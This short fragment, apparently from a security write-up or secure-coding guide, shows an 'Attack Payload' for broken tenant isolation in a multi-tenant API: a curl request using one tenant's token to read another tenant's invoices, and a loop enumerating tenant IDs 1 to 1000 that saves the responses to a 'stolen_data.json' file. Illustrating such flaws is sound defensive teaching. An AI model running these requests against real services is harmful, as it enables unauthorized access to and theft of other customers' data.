```

**Attack Payload**:
```bash
# Attacker from tenant 5 accesses tenant 1's invoices
curl -H "Authorization: Bearer valid_tenant5_token" \
     "https://api.example.com/api/tenants/1/invoices"

# Enumerate all tenants to steal data
for i in {1..1000}; do
  curl -s "https://api.example.com/api/invoices?tenant_id=$i" >> stolen_data.json
done
